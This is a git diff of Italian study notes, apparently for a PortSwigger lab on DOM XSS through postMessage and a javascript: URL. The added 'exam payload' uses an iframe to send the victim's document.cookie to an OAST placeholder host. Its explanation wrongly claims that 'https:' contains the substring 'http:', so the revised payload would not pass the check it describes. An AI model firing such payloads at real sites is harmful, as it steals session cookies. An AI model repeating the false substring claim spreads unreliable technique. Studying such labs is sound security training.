@@ -100,7 +100,7 @@ git-cola --repo TARGET.web-security-academy.net/
 - Segnale: l'event listener contiene un controllo debole con `indexOf()` che cerca la stringa `"http:"` (o `"https:"`) ovunque all'interno del messaggio, prima di passare il valore al sink `location.href`.
 - Soluzione: inviare come dato del messaggio un payload `javascript:` che contiene anche, da qualche parte nella stringa (es. dopo un commento `//`), la sottostringa `"http:"` richiesta dal controllo, così da superarlo e far eseguire l'URL al sink.
 - Payload: `this.contentWindow.postMessage('javascript:print()//http:','*')`
-- Payload da esame (Burp Collaborator): `this.contentWindow.postMessage('javascript:document.location="https://YOUR-SUBDOMAIN.burpcollaborator.net/?c="+document.cookie%2f%2fhttp:','*')`
+- Payload da esame (Burp Collaborator/OAST): `<iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('javascript:document.location=\`https://OASTIFY.COM?c=\`+document.cookie','*')">` — qui il check passa da solo, perché l'URL del payload inizia già con `https:`, che contiene la sottostringa `http:` richiesta dal controllo (non serve aggiungere `//http:` a mano).
 - Link: [DOM XSS using web messages and a JavaScript URL](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url)
 - Step: 1
 
